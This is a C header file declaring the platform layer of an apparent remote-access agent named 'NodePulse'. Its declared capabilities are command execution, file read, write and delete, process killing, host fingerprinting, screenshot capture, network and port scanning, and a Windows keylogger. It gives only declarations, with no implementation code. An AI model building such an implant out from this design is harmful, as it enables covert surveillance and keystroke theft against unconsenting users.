/*
 * NodePulse Agent Platform Abstraction Layer
 * 
 * Cross-platform interface for OS-specific operations.
 * Implementations are in platform_win.c, platform_linux.c, platform_darwin.c
 */

#ifndef PLATFORM_H
#define PLATFORM_H

#include <stddef.h>

/* ============================================================================
 * Platform Detection
 * ============================================================================ */

#if defined(_WIN32) || defined(_WIN64)
    #define PLATFORM_WINDOWS 1
#elif defined(__linux__)
    #define PLATFORM_LINUX 1
#elif defined(__APPLE__) && defined(__MACH__)
    #define PLATFORM_DARWIN 1
#else
    #error "Unsupported platform"
#endif

/* ============================================================================
 * Initialization
 * ============================================================================ */

/* Initialize platform-specific resources */
int platform_init(void);

/* Cleanup platform-specific resources */
void platform_cleanup(void);

/* ============================================================================
 * HTTP Transport
 * ============================================================================ */

/* HTTP response structure */
typedef struct {
    char* data;
    size_t size;
    int status_code;
} HttpResponse;

/* Perform HTTP POST request
 * Returns: 0 on success, -1 on error
 * Caller must free response->data */
int http_post(const char* url, const char* data, size_t data_len, 
              const char* content_type, HttpResponse* response);

/* Perform HTTP POST request with custom headers
 * headers is an array of key-value pairs: [key1, value1, key2, value2, ...]
 * header_count is the total number of strings (keys + values)
 * Returns: 0 on success, -1 on error */
int http_post_with_headers(const char* url, const char* data, size_t data_len,
                           const char* content_type, const char** headers,
                           int header_count, HttpResponse* response);

/* Perform HTTP GET request */
int http_get(const char* url, HttpResponse* response);

/* Free HTTP response data */
void http_response_free(HttpResponse* response);

/* ============================================================================
 * Process Execution
 * ============================================================================ */

/* Execute a shell command and capture output
 * Returns: exit code, output is allocated (caller must free) */
int run_command(const char* cmd, char** output, size_t* output_len);

/* Get list of running processes (JSON format) */
int get_process_list(char** output);

/* Kill a process by PID */
int kill_process(int pid);

/* ============================================================================
 * System Information
 * ============================================================================ */

/* Get system hostname */
int get_hostname(char* buf, size_t len);

/* Get current username */
int get_username(char* buf, size_t len);

/* Get OS name and version */
int get_os_info(char* buf, size_t len);

/* Get system architecture */
int get_arch_info(char* buf, size_t len);

/* Get primary internal IP address */
int get_internal_ip(char* buf, size_t len);

/* Get external IP address (via HTTP) */
int get_external_ip(char* buf, size_t len, const char* service_url);

/* Get MAC address of primary interface */
int get_mac_address(char* buf, size_t len);

/* Get system uptime in seconds */
long get_system_uptime(void);

/* Get memory usage info (JSON format) */
int get_memory_info(char** output);

/* Get disk usage info (JSON format) */
int get_disk_info(char** output);

/* ============================================================================
 * File Operations
 * ============================================================================ */

/* Read entire file into memory
 * Caller must free *content */
int file_read(const char* path, char** content, size_t* len);

/* Write data to file */
int file_write(const char* path, const char* content, size_t len);

/* Append data to file */
int file_append(const char* path, const char* content, size_t len);

/* Delete a file */
int file_delete(const char* path);

/* Check if file exists */
int file_exists(const char* path);

/* Get file size */
long file_size(const char* path);

/* List directory contents (JSON format) */
int file_list(const char* path, char** output);

/* List directory tree recursively up to specified depth (JSON format) */
int file_list_recursive(const char* path, int depth, char** output);

/* Create directory (recursive) */
int dir_create(const char* path);

/* ============================================================================
 * Screenshot (Platform-specific)
 * ============================================================================ */

/* Capture screenshot and encode as base64
 * Returns: 0 on success, -1 on error
 * Caller must free *base64_data */
int capture_screenshot(char** base64_data);

/* ============================================================================
 * Network Scanning
 * ============================================================================ */

/* Scan local network for active hosts
 * Returns JSON array of discovered hosts */
int network_scan_hosts(const char* subnet, char** output);

/* Scan ports on a specific host */
int network_scan_ports(const char* host, int* ports, int port_count, char** output);

/* Get local network interfaces (JSON format) */
int get_network_interfaces(char** output);

/* ============================================================================
 * Keylogger (Windows only, no-op on other platforms)
 * ============================================================================ */

/* Start keyboard capture */
int keylogger_start(void);

/* Stop keyboard capture */
int keylogger_stop(void);

/* Get captured keystrokes and clear buffer */
int keylogger_get_buffer(char** output);

/* ============================================================================
 * Utility Functions
 * ============================================================================ */

/* Sleep for specified milliseconds */
void platform_sleep(int milliseconds);

/* Get current timestamp (Unix epoch) */
long platform_time(void);

/* Generate random bytes */
int platform_random(unsigned char* buf, size_t len);

/* Base64 encode data */
char* base64_encode(const unsigned char* data, size_t len);

/* Base64 decode data */
unsigned char* base64_decode(const char* encoded, size_t* out_len);

/* URL encode string */
char* url_encode(const char* str);

#endif /* PLATFORM_H */
